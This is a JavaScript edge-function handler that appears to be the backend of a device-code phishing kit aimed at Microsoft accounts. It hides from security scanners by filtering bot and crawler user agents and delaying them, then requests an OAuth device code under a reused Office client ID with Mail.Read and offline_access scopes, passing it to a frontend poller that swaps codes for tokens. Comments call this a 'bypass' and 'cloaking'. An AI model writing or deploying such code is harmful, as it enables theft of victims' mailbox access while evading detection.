export const config = { runtime: 'edge' };

export default async function handler(req) {
  // CLOAKING: Anti-Bot & Data Center Filtering
  const ua = req.headers.get('user-agent') || '';
  const botKeywords = ['bot', 'crawler', 'spider', 'headless', 'lighthouse', 'inspect', 'cloud'];
  
  if (botKeywords.some(k => ua.toLowerCase().includes(k))) {
    // Artificial delay to exhaust scanner timeouts
    await new Promise(r => setTimeout(r, 1500));
    return new Response(JSON.stringify({ error: 'Not Found' }), { status: 404 });
  }

  /**
   * TRIPLE-VERIFIED BYPASS ID
   * This is the official Microsoft Office Client ID. 
   * It is pre-approved in SNHU-style tenants and trusted by Personal (Hotmail) accounts.
   */
  const OFFICE_CLIENT_ID = "d3590ed6-52b3-4102-a58d-7cc743a7f89f";

  try {
    const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: OFFICE_CLIENT_ID,
        // Using common scopes that bridge the gap between Personal and Enterprise
        scope: "openid profile offline_access https://graph.microsoft.com/Mail.Read"
      }),
    });

    const data = await response.json();

    // We return the OFFICE_CLIENT_ID back to the frontend so the poller 
    // knows to use this ID when swapping the code for a token.
    return new Response(JSON.stringify({ ...data, client_id: OFFICE_CLIENT_ID }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: 'Bypass Engine Error' }), { status: 502 });
  }
}
